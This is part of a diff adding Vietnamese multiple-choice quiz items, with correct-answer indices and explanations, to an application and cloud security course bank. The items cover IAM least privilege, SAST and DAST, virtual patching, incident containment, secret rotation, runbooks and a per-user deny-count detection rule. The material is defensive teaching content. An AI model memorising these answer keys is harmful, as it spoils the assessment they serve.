+    "explanation": "Log nguyên request.json sẽ ghi luôn mật khẩu/token vào log tập trung mà nhiều người đọc được.\n✓ Dump cả body có thể chứa secret, tạo ra kho dữ liệu nhạy cảm dễ bị tấn công\n✗ Hiệu năng f-string không phải vấn đề bảo mật cốt lõi ở đây\n✗ Đăng nhập thành công không cần mức ERROR\n✗ Vấn đề là rò rỉ secret, không phải thiếu timestamp (đó là vấn đề khác)"
+  },
+  {
+    "id": "sec-q-081",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một microservice xử lý thumbnail bị RCE qua thư viện ảnh cũ. Nếu service đó chạy với IAM policy Action:\"*\" Resource:\"*\", hậu quả lớn nhất là gì?",
+    "options": [
+      "Blast radius khổng lồ: một lỗ hổng ở tính năng phụ cho phép truy cập toàn bộ DB/S3 production, thành rò rỉ dữ liệu toàn diện",
+      "Service thumbnail sẽ chạy chậm vì phải đánh giá quá nhiều quyền",
+      "WAF sẽ tự động chặn vì policy quá rộng",
+      "Không sao cả vì RCE chỉ ảnh hưởng trong container"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Quyền *:* biến lỗ hổng nhỏ thành toàn quyền trên mọi tài nguyên — đó là blast radius.\n✓ Role quá rộng cho phép kẻ chiếm service đọc toàn bộ DB/S3 prod, rò rỉ toàn diện\n✗ Vấn đề là phạm vi thiệt hại, không phải hiệu năng đánh giá policy\n✗ WAF lọc HTTP request, không liên quan IAM policy của service\n✗ RCE cộng quyền IAM rộng vượt khỏi container, đây chính là lateral movement"
+  },
+  {
+    "id": "sec-q-082",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Team chỉ chạy SAST trong CI rồi tuyên bố \"đã quét bảo mật\". Lỗi nào nhiều khả năng vẫn lọt qua?",
+    "options": [
+      "Broken Access Control / IDOR — user A sửa được đơn của user B do thiếu kiểm tra quyền sở hữu (lỗi business logic)",
+      "Hardcoded secret trong source code",
+      "SQL injection do nối chuỗi truy vấn",
+      "Dùng hàm mã hóa yếu (crypto sai)"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "SAST phân tích code tĩnh, gần như không hiểu logic nghiệp vụ về quyền sở hữu.\n✓ IDOR/Broken Access Control là lỗi business logic, SAST hầu như không bắt; cần DAST/IAST có session đã đăng nhập và test người viết\n✗ Hardcoded secret là thứ SAST bắt tốt\n✗ Injection do nối chuỗi là sở trường của SAST\n✗ Crypto sai cũng nằm trong nhóm SAST phát hiện được"
+  },
+  {
+    "id": "sec-q-083",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Phát hiện một CVE mới trong thư viện đang dùng nhưng chưa kịp deploy bản vá. Biện pháp tạm thời nhanh nhất theo bài là gì?",
+    "options": [
+      "Thêm WAF rule chặn pattern khai thác (virtual patching) trong vài phút trong khi chờ vá code",
+      "Tắt toàn bộ ứng dụng cho tới khi vá xong",
+      "Bỏ qua vì CVE chỉ là lý thuyết",
+      "Tăng mức log lên DEBUG để theo dõi"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Virtual patching dùng WAF chặn pattern khai thác ngay, mua thời gian để vá đúng cách.\n✓ Thêm WAF rule chặn payload khai thác là biện pháp tạm vài phút trong khi chờ deploy vá\n✗ Tắt cả ứng dụng là phản ứng thái quá, gây gián đoạn không cần thiết\n✗ Bỏ qua CVE đã biết là rủi ro nghiêm trọng\n✗ Tăng log không ngăn được khai thác"
+  },
+  {
+    "id": "sec-q-084",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Server web bị nghi đã bị chiếm. Một kỹ sư định lập tức tắt máy \"cho an toàn\". Vì sao đây là phản xạ sai trong pha Contain?",
+    "options": [
+      "Tắt máy phá hủy bằng chứng (RAM forensics) và có thể kích hoạt cơ chế phá hủy của malware; nên cô lập, snapshot rồi mới hành động",
+      "Tắt máy không sao, nhưng nên xóa ổ đĩa luôn cho chắc",
+      "Tắt máy đúng nhưng phải chờ IC phê duyệt qua email",
+      "Tắt máy sai vì sẽ làm mất kết nối mạng nội bộ"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Containment cần ngăn lan rộng nhưng vẫn bảo toàn bằng chứng; tắt máy hủy chứng cứ.\n✓ Tắt máy mất RAM forensics và có thể kích hoạt malware tự hủy; nên cô lập (security group cách ly), snapshot rồi mới xử lý\n✗ Xóa ổ đĩa còn tệ hơn, phá hủy toàn bộ bằng chứng\n✗ Vấn đề không phải quy trình phê duyệt mà là bảo toàn bằng chứng\n✗ Lý do thực sự là mất bằng chứng, không phải mất kết nối nội bộ"
+  },
+  {
+    "id": "sec-q-085",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một access key bị phát hiện lộ trong public repo. Theo nguyên tắc Eradicate trong bài, giả định đúng cần đặt ra là gì?",
+    "options": [
+      "Mọi resource mà key đó chạm tới đều coi như đã bị xâm phạm, phải xoay mọi secret downstream",
+      "Chỉ cần đổi key đó là đủ vì kẻ tấn công chưa kịp dùng",
+      "Chỉ xử lý khi audit log chứng minh có truy cập trái phép",
+      "Key trong repo private nên không cần làm gì"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Eradicate yêu cầu diệt tận gốc, giả định xấu nhất với secret đã lộ.\n✓ Giả định mọi thứ key chạm tới đã bị xâm phạm và xoay toàn bộ secret downstream\n✗ Chỉ đổi mỗi key đó là xử lý triệu chứng, bỏ sót phạm vi\n✗ Chờ bằng chứng mới hành động là quá chậm với key đã công khai\n✗ Tình huống nói rõ key lộ trong public repo, không phải private"
+  },
+  {
+    "id": "sec-q-086",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Mục tiêu chính của blameless postmortem là gì?",
+    "options": [
+      "Tìm nguyên nhân hệ thống và hành động sửa chữa để sự cố không lặp lại, không tìm người để đổ lỗi",
+      "Xác định kỹ sư nào cẩu thả để kỷ luật",
+      "Viết báo cáo càng ngắn càng tốt để khép sự cố",
+      "Chứng minh đội bảo mật vô can"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Blameless tập trung vào hệ thống vì chỉ khi an toàn tâm lý mọi người mới kể thật.\n✓ Mục tiêu là nguyên nhân hệ thống và action item để không lặp lại\n✗ Đổ lỗi cá nhân khiến người ta giấu thông tin cần để sửa\n✗ Ngắn gọn không phải mục tiêu; học được bài học mới là\n✗ Mục tiêu là cải thiện hệ thống, không phải bào chữa cho đội nào"
+  },
+  {
+    "id": "sec-q-087",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Theo bài, vì sao DAST thường được đặt ở stage nightly/staging chứ không chặn mỗi pull request như SAST?",
+    "options": [
+      "Vì DAST cần app đã deploy và chạy chậm hơn, không phù hợp chặn từng PR",
+      "Vì DAST cho nhiều false positive hơn SAST",
+      "Vì DAST chỉ phân tích source code tĩnh",
+      "Vì DAST không bao giờ bắt được lỗi cấu hình"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "DAST tấn công app đang chạy từ bên ngoài nên cần môi trường deploy và tốn thời gian.\n✓ DAST cần app deploy và chạy chậm nên đặt nightly/staging thay vì gate mỗi PR\n✗ Chính SAST mới nổi tiếng nhiều false positive; IAST/DAST chính xác hơn về runtime\n✗ Phân tích code tĩnh là SAST, không phải DAST\n✗ DAST lại bắt tốt lỗi cấu hình và authz runtime"
+  },
+  {
+    "id": "sec-q-088",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Khi cấu hình security gate trong CI, nên đặt thế nào để gate không bị kỹ sư phớt lờ?",
+    "options": [
+      "Fail build ở severity HIGH/CRITICAL, chỉ cảnh báo (warn) ở mức thấp, để tránh ồn vì false positive",
+      "Fail build trên mọi finding bất kể severity để tuyệt đối an toàn",
+      "Chỉ warn ở mọi mức, không bao giờ fail build",
+      "Tắt gate trên nhánh main vì code đã review"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Gate quá ồn vì false positive sẽ khiến kỹ sư học cách bỏ qua, mất luôn lớp phòng thủ.\n✓ Fail ở HIGH/CRITICAL, warn ở mức thấp để giữ tín hiệu sạch và không bị phớt lờ\n✗ Fail trên mọi finding tạo quá nhiều nhiễu, phản tác dụng\n✗ Chỉ warn khắp nơi thì lỗi nghiêm trọng vẫn lọt qua\n✗ Tắt gate trên main là bỏ phòng thủ ngay nơi quan trọng nhất"
+  },
+  {
+    "id": "sec-q-089",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Theo bài, một runbook bảo mật TỐT cần có những đặc điểm nào? (chọn tất cả đáp án đúng)",
+    "options": [
+      "Bắt đầu bằng điều kiện \"khi nào dùng\" rõ ràng",
+      "Các bước đánh số, làm được ngay, không cần phán đoán mơ hồ",
+      "Được diễn tập định kỳ (game day / tabletop)",
+      "Chỉ lưu trong wiki chạy trên chính hạ tầng production",
+      "Để người trực tự ứng biến mọi bước trong lúc sự cố cho linh hoạt"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Runbook tốt là quy trình viết sẵn, đánh số, đã test, truy cập được kể cả khi hệ thống sập.\n✓ Có điều kiện kích hoạt rõ ràng giúp biết khi nào áp dụng\n✓ Bước đánh số làm ngay giúp người không chuyên xử lý lúc 3 giờ sáng\n✓ Diễn tập định kỳ để runbook không hỏng đúng lúc cần\n✗ Lưu chỉ trong wiki trên hạ tầng đang cháy là sai; phải truy cập được khi hệ thống chính sập\n✗ Mục đích runbook là tránh phải tự ứng biến trong lúc căng thẳng"
+  },
+  {
+    "id": "sec-q-090",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Theo checklist least-privilege và secure defaults trong bài, đâu là các thực hành ĐÚNG? (chọn tất cả đáp án đúng)",
+    "options": [
+      "Dùng credential tạm thời (short-lived token, OIDC) thay cho long-lived access key",
+      "Storage bucket private mặc định, chặn public access ở cấp tổ chức",
+      "Security group mặc định deny inbound, mở port là ngoại lệ phải khai báo",
+      "Mỗi service dùng chung một \"god role\" cho tiện quản lý",
+      "Dùng wildcard * trên Action/Resource ở production để khỏi sửa policy nhiều lần"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Least privilege và secure defaults: quyền tối thiểu, trạng thái an toàn là mặc định.\n✓ Credential tạm thời giảm rủi ro key dài hạn bị lộ\n✓ Bucket private mặc định và block public access ngăn rò rỉ do cấu hình\n✓ Firewall mặc định deny inbound, mở port phải có chủ đích\n✗ God role dùng chung phá vỡ least privilege và tăng blast radius\n✗ Wildcard * ở production là chống chỉ định trong checklist"
+  },
+  {
+    "id": "sec-q-091",
+    "courseId": "SECURITY",
+    "lesson": "sec-07-cloud-appsec-ops",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Detection rule đếm COUNT(outcome=deny) BY user_id > 100 IN 1m nhằm phát hiện hành vi nào?",
+    "options": [
+      "Một user đang dò IDOR / Broken Access Control (hàng loạt 403 bị từ chối)",
+      "Một user đang đăng nhập thành công bình thường",
+      "Một đợt tấn công DDoS layer-3",
+      "Một quá trình backup dữ liệu định kỳ"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Hàng loạt deny/403 từ cùng một user là dấu hiệu đang thử truy cập tài nguyên không thuộc về mình.\n✓ Lượng lớn deny theo user_id trong thời gian ngắn là dấu hiệu dò IDOR/Broken Access Control\n✗ Đăng nhập thành công có outcome allow, không phải deny\n✗ DDoS layer-3 ở tầng mạng, không sinh ra log deny authz theo user\n✗ Backup định kỳ không tạo ra loạt từ chối quyền"
   }
 ]
